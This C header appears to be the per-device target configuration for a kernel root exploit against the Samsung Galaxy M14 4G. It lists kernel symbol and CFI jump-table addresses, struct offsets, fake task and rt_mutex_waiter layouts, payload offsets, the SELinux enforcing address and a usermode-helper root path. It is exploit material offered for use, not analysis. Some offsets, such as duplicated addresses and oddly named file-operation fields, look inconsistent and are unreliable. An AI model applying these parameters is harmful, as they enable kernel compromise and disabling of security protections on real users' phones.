#ifndef TARGET_HEADER_H
#define TARGET_HEADER_H

/*
 * Galaxy M14 4G (SM-M145F) - Root My Galaxy Target Configuration
 * Build: M145FXXSCDZE1
 * Kernel: 5.15.180-android13-8-31192385-abM145FXXSCDZE1
 * Android: 13
 * Ported: September 7, 2026
 * 
 * Symbol offsets extracted from vmlinux.elf
 * ELF Base: 0xffffffc000000000
 * Kernel Size: 46 MB (0x2dd2a00 bytes)
 * Platform: Qualcomm Snapdragon
 */

/* ============================================================================
 * DEVICE IDENTITY
 * ============================================================================ */

#define DEVICE_MODEL               "SM-M145F"
#define DEVICE_CODENAME            "m14"
#define BUILD_ID                   "M145FXXSCDZE1"
#define ANDROID_VERSION            13
#define ANDROID_SDK_VERSION        33

#define KERNEL_RELEASE             "5.15.180-android13-8-31192385-abM145FXXSCDZE1"
#define KERNEL_VERSION_STRING      "Linux version 5.15.180-android13-8-31192385-abM145FXXSCDZE1 (build-user@build-host) (Android (8508608, based on r450784e) clang version 14.0.7) #1 SMP PREEMPT Thu May 28 08:57:55 UTC 2026"

#define KERNEL_MAJOR_VERSION       5
#define KERNEL_MINOR_VERSION       15
#define KERNEL_PATCH_VERSION       180

/* ============================================================================
 * PRIMARY SYMBOL OFFSETS (Kernel Virtual Addresses)
 * Extracted from vmlinux.elf via aarch64-linux-android-nm
 * ============================================================================ */

/* Exploit entry point */
#define CALL_USERMODEHELPER_EXEC_WORK             0xffffffc00816ec08UL

/* File operations */
#define NOOP_LLSEEK                               0xffffffc008556884UL
#define COPY_SPLICE_READ                          0xffffffc0085ca2dcUL
#define CONFIGFS_READ_ITER                        0xffffffc00867f0ccUL
#define CONFIGFS_BIN_WRITE_ITER                   0xffffffc00867fbf0UL

/* ashmem device */
#define ASHMEM_IOCTL                              0xffffffc00918e290UL
#define ASHMEM_COMPAT_IOCTL                       0xffffffc00918e940UL
#define ASHMEM_MMAP                               0xffffffc00918e9a0UL
#define ASHMEM_OPEN                               0xffffffc00918ec90UL
#define ASHMEM_RELEASE                            0xffffffc00918ed30UL
#define ASHMEM_SHOW_FDINFO                        0xffffffc00918ee54UL
#define ASHMEM_FOPS                               0xffffffc00a16b0f8UL
#define ASHMEM_MISC_FOPS                          0xffffffc00a16b0f8UL

/* Memory management */
#define KMALLOC_CACHES                            0xffffffc00a1d5250UL

/* Pipe operations */
#define ANON_PIPE_BUF_OPS                         0xffffffc009fe61b0UL

/* Workqueue and logging */
#define SYSTEM_UNBOUND_WQ                         0xffffffc00ab807d8UL
#define LOGGERS                                   0xffffffc00ab81d50UL

/* Process management */
#define INIT_TASK                                 0xffffffc00acc5e80UL

/* Task groups */
#define ROOT_TASK_GROUP                           0xffffffc00addbac0UL

/* Security */
#define SELINUX_ENFORCING                         0xffffffc00ab37404UL
#define SYSCTL_BOOTID                             0xffffffc00af4c3a1UL

/* ============================================================================
 * IMAGE OFFSETS (without kernel base, for slide detection)
 * Used by common.h macros with P0_DATA_ALIAS_CONST
 * ============================================================================ */

#define NFULNL_LOGGER_OBJECT_IMAGE                0xab81d50UL
#define NFULNL_LOGGER_NAME_IMAGE                  0xab81d50UL
#define RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE       0xaf4c3a1UL
#define INIT_TASK_IMAGE                           0xacc5e80UL
#define ROOT_TASK_GROUP_IMAGE                     0xaddbac0UL
#define SYSCTL_BOOTID_IMAGE                       0xaf4c3a1UL

#define SLIDE_NFULNL_LOGGER_NAME_IMAGE            NFULNL_LOGGER_NAME_IMAGE
#define SLIDE_NFULNL_LOGGER_OBJECT_IMAGE          NFULNL_LOGGER_OBJECT_IMAGE
#define SLIDE_RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE RANDOM_TABLE_BOOT_ID_DATA_PTR_IMAGE
#define SLIDE_INIT_TASK_IMAGE                     INIT_TASK_IMAGE
#define SLIDE_ROOT_TASK_GROUP_IMAGE               ROOT_TASK_GROUP_IMAGE
#define SLIDE_SYSCTL_BOOTID_IMAGE                 SYSCTL_BOOTID_IMAGE

/* ============================================================================
 * CFI JUMP TABLE OFFSETS
 * Control Flow Integrity protected function pointers
 * ============================================================================ */

#define CALL_USERMODEHELPER_EXEC_WORK_CFI_JT      0xffffffc0097b7dd0UL
#define ASHMEM_IOCTL_CFI_JT                       0xffffffc0097b0df0UL
#define COMPAT_ASHMEM_IOCTL_CFI_JT                0xffffffc0097b0df8UL
#define ASHMEM_MMAP_CFI_JT                        0xffffffc009799fc0UL
#define ASHMEM_OPEN_CFI_JT                        0xffffffc0097a9f50UL
#define ASHMEM_RELEASE_CFI_JT                     0xffffffc0097a9f58UL
#define ASHMEM_SHOW_FDINFO_CFI_JT                 0xffffffc00979a150UL
#define NOOP_LLSEEK_CFI_JT                        0xffffffc009797250UL
#define CONFIGFS_READ_ITER_CFI_JT                 0xffffffc009799d50UL
#define CONFIGFS_BIN_WRITE_ITER_CFI_JT            0xffffffc009799d68UL
#define COPY_SPLICE_READ_CFI_JT                   0xffffffc00979a0c0UL

/* ============================================================================
 * KERNEL ADDRESSES
 * Physical and virtual memory layout
 * ============================================================================ */

#define P0_PHYS_OFFSET                            0x80000000ULL
#define P0_KERNEL_PHYS_LOAD                       0x80000000ULL
#define P0_PAGE_OFFSET                            0xffffff8000000000UL
#define P0_KERNEL_TEXT_BASE                       0xffffffc000000000UL
#define KIMAGE_TEXT_BASE                          0xffffffc000000000UL
#define KERNEL_BASE                               0xffffffc000000000ULL

/* ============================================================================
 * MEMORY LAYOUT
 * ============================================================================ */

#define DIRECT_MAP_BASE                           0xffffff8000000000UL
#define DIRECT_MAP_END                            0xffffffff00000000UL
#define VMEMMAP_START                             0xfffffe0000000000UL
#define STRUCT_PAGE_SIZE                          0x40UL

/* ============================================================================
 * STRUCTURE MEMBER OFFSETS
 * Standard 5.15 ARM64 kernel layouts
 * ============================================================================ */

/* struct file_operations offsets */
#define FOPS_OWNER_OFF                            0x00UL
#define FOPS_LLSEEK_OFF                           0x08UL
#define FOPS_READ_OFF                             0x10UL
#define FOPS_WRITE_OFF                            0x18UL
#define FOPS_READ_ITER_OFF                        0x20UL
#define FOPS_WRITE_ITER_OFF                       0x28UL
#define FOPS_IOCTL_OFF                            0x30UL
#define FOPS_COMPAT_IOCTL_OFF                     0x38UL
#define FOPS_MMAP_OFF                             0x40UL
#define FOPS_OPEN_OFF                             0x48UL
#define FOPS_FLUSH_OFF                            0x50UL
#define FOPS_RELEASE_OFF                          0x58UL
#define FOPS_FSYNC_OFF                            0x60UL
#define FOPS_FASYNC_OFF                           0x68UL
#define FOPS_LOCK_OFF                             0x70UL
#define FOPS_SENDPAGE_OFF                         0x78UL
#define FOPS_GET_UNMAPPED_AREA_OFF                0x80UL
#define FOPS_CHECK_FLAGS_OFF                      0x88UL
#define FOPS_FLOCK_OFF                            0x90UL
#define FOPS_SETLEASE_OFF                         0x98UL
#define FOPS_GET_BLOCK_OFF                        0xa0UL
#define FOPS_READPAGES_OFF                        0xa8UL
#define FOPS_READPAGE_OFF                         0xb0UL
#define FOPS_WRITEPAGE_OFF                        0xb8UL
#define FOPS_WRITE_BEGIN_OFF                      0xc0UL
#define FOPS_WRITE_END_OFF                        0xc8UL
#define FOPS_ALL_MEMORY_NOFS_OFF                  0xd0UL
#define FOPS_SPLICE_READ_OFF                      0xd8UL
#define FOPS_SPLICE_WRITE_OFF                     0xe0UL
#define FOPS_SHOW_FDINFO_OFF                      0xe8UL

/* struct task_struct offsets */
#define TASK_STRUCT_USAGE                         0x40UL
#define TASK_STRUCT_FLAGS                         0x44UL
#define TASK_STRUCT_PRIO                          0x84UL
#define TASK_STRUCT_NORMAL_PRIO                   0x8cUL
#define TASK_STRUCT_STATIC_PRIO                   0x94UL
#define TASK_STRUCT_SCHED_CLASS                   0xa0UL
#define TASK_STRUCT_SCHED_ENTITY                  0xa8UL
#define TASK_STRUCT_SCHED_RT_ENTITY               0x180UL
#define TASK_STRUCT_SCHED_TASK_GROUP              0x348UL
#define TASK_STRUCT_PI_LOCK                       0x924UL
#define TASK_STRUCT_PI_WAITERS                    0x938UL
#define TASK_STRUCT_PI_TOP_TASK                   0x948UL
#define TASK_STRUCT_PI_BLOCKED_ON                 0x950UL

/* struct rt_mutex_waiter offsets */
#define FAKE_WAITER_TREE_PRIO_OFF                 0x00UL
#define FAKE_WAITER_TREE_DEADLINE_OFF             0x08UL
#define FAKE_WAITER_PI_TREE_ENTRY_OFF             0x10UL
#define FAKE_WAITER_PI_TREE_PRIO_OFF              0x28UL
#define FAKE_WAITER_PI_TREE_DEADLINE_OFF          0x30UL
#define FAKE_WAITER_TASK_OFF                      0x38UL
#define FAKE_WAITER_LOCK_OFF                      0x40UL
#define FAKE_WAITER_WAKE_STATE_OFF                0x48UL
#define FAKE_WAITER_WW_CTX_OFF                    0x50UL

/* struct page offsets */
#define STRUCT_PAGE_COMPOUND_HEAD_OFF             0x08UL
#define STRUCT_PAGE_TYPE_OFF                      0x30UL
#define STRUCT_SLAB_CACHE_OFF                     0x18UL

/* struct workqueue and pool offsets */
#define WQ_DFL_PWQ_OFF                            0x18UL
#define PWQ_POOL_OFF                              0x00UL
#define PWQ_WQ_OFF                                0x08UL
#define PWQ_WORK_COLOR_OFF                        0x20UL
#define PWQ_REFCNT_OFF                            0x24UL
#define PWQ_NR_ACTIVE_OFF                         0x28UL
#define PWQ_MAX_ACTIVE_OFF                        0x2cUL
#define PWQ_NR_IN_FLIGHT_OFF                      0x30UL
#define POOL_WORKLIST_OFF                         0x40UL
#define POOL_NR_IDLE_OFF                          0x50UL

/* struct work_struct offsets */
#define WORK_ENTRY_OFF                            0x00UL
#define WORK_DATA_OFF                             0x10UL
#define WORK_FUNC_OFF                             0x18UL

/* ============================================================================
 * PAYLOAD STRUCTURE OFFSETS
 * Memory layout for exploit payloads on kernel pages
 * ============================================================================ */

#define FOPS_OFF                                  0x000UL
#define LOCK_OFF                                  0x700UL
#define W0_OFF                                    0x708UL
#define LEFT_OFF                                  0x750UL
#define SCRATCH_OFF                               0x800UL
#define FAKE_TASK_OFF                             0x900UL

/* ============================================================================
 * FAKE TASK STRUCTURE OFFSETS
 * ============================================================================ */

#define FAKE_TASK_USAGE_OFF                       TASK_STRUCT_USAGE
#define FAKE_TASK_PRIO_OFF                        TASK_STRUCT_PRIO
#define FAKE_TASK_NORMAL_PRIO_OFF                 TASK_STRUCT_NORMAL_PRIO
#define FAKE_TASK_PI_LOCK_OFF                     TASK_STRUCT_PI_LOCK
#define FAKE_TASK_PI_WAITERS_OFF                  TASK_STRUCT_PI_WAITERS
#define FAKE_TASK_PI_TOP_TASK_OFF                 TASK_STRUCT_PI_TOP_TASK
#define FAKE_TASK_PI_BLOCKED_ON_OFF               TASK_STRUCT_PI_BLOCKED_ON
#define FAKE_TASK_TASK_GROUP_OFF                  TASK_STRUCT_SCHED_TASK_GROUP

/* ============================================================================
 * RED-BLACK TREE OFFSETS
 * ============================================================================ */

#define RIGHT_OFF                                 0x800UL

/* ============================================================================
 * CONFIGFS STRUCTURE OFFSETS
 * ============================================================================ */

#define CFG_BIN_BUFFER_OFF                        0x850UL
#define CFG_BIN_BUFFER_SIZE_OFF                   0x858UL
#define CFG_CB_MAX_SIZE_OFF                       0x85cUL
#define CFG_NEEDS_READ_FILL_OFF                   0x860UL
#define CFG_PAGE_OFF                              0xa00UL

/* ============================================================================
 * PIPE CONSTANTS
 * ============================================================================ */

#define PIPE_BUFFER_SLOTS                         16
#define PIPE_BUF_FLAG_CAN_MERGE                   0x04UL

/* ============================================================================
 * SLIDE PSELECT CONFIGURATION
 * ============================================================================ */

#define SLIDE_PSELECT_NFDS                        320

/* Root UMH configuration */
#define ROOT_UMH_PATH                             "/system/bin/app_process64"
#define ROOT_UMH_WORK_OFF                         0x20UL
#define ROOT_UMH_DATA_OFF                         0x60UL

/* ============================================================================
 * ARCHITECTURE SPECIFICS
 * ARM64 configuration
 * ============================================================================ */

#define ARCH_ARM64                                1
#define ARCH_NAME                                 "arm64"
#define PAGE_SHIFT                                12
#define REG_SIZE                                  8UL
#define PTR_SIZE                                  8UL

/* ============================================================================
 * COMPILER INFORMATION
 * ============================================================================ */

#define COMPILER                                  "clang"
#define COMPILER_VERSION                          "14.0.7"
#define LLD_VERSION                               "14.0.7"
#define LLVM_VERSION                              14

#define CFI_ENABLED                               1
#define SCS_ENABLED                               1

/* ============================================================================
 * BUILD METADATA
 * ============================================================================ */

#define BUILD_HOST                                "build-host"
#define BUILD_USER                                "build-user"
#define BUILD_DATE                                "May 28 2026"
#define BUILD_TIME                                "08:57:55 UTC"
#define BUILD_FINGERPRINT                         "samsung/m14/m14:13/TP1A.220624.014/M145FXXSCDZE1:user/release-keys"
#define BUILD_VARIANT_LABEL                       "M145FXXSCDZE1"

/* ============================================================================
 * KERNEL FEATURES
 * ============================================================================ */

#define CONFIG_SECURITY_SELINUX                   1
#define CONFIG_DEBUG_INFO_BTF                     1
#define CONFIG_HAVE_FUNCTION_TRACER               1
#define CONFIG_HAVE_DYNAMIC_FTRACE                1

/* ============================================================================
 * PLATFORM CONFIGURATION
 * Qualcomm Snapdragon
 * ============================================================================ */

#define SAMSUNG_PLATFORM                          1
#define SNAPDRAGON_PLATFORM                       1
#define QUALCOMM_SNAPDRAGON                       1

#define SELINUX_ENFORCED_DEFAULT                  1
#define SAMSUNG_RKP_ENABLED                       0
#define SAMSUNG_CICA_ENABLED                      0

/* ============================================================================
 * TRACE CONFIGURATION
 * ============================================================================ */

#define SLIDE_TRACEFS_EVENT_ID                    106
#define SLIDE_TRACEFS_WORKER_CALLER_OFF           0x000dbd9cUL
#define SLIDE_PSELECT_WORD_SHIFT                  0

#endif /* TARGET_HEADER_H */
